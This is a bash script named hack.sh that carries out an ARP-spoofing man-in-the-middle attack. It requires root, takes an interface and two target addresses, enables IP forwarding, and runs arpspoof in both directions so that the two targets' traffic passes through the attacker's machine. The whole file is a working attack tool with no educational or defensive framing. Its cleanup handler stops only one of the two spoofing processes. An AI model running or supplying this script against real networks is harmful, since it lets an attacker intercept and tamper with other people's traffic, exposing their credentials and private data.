#!/bin/bash
if [ "$(id -u)" != 0 ] ; then
	echo "Please run as root"
	exit 1
fi

if [ "$#" == 0 ] ; then
	echo "Execute sudo ./hack.sh [interface] [target 1] [target 2]"
	exit 2
fi

if [ "$#" != 3 ] ; then
	echo "Invalid number of arguments"
	echo "[interface] [target 1] [target 2]"
	exit 3
fi

if [ "$2" == "$3" ] ; then
	echo "Target 1 and Target 2 must have different"
	exit 4
fi

echo "Forwarding IPv4 packets - Enabled"
sysctl -w net.ipv4.ip_forward=1

trap 'kill $PID; echo ""; echo "Stopped Man In The Middle between $2 and $3"; echo "Forwarding IPv4 packets - Disabled"; sysctl -w net.ipv4.ip_forward=0; exit' INT

arpspoof -i $1 -t $2 $3 2> /dev/null &
arpspoof -i $1 -t $3 $2 2> /dev/null &

PID=$!

echo "Started Man In The Middle between $2 and $3"

wait
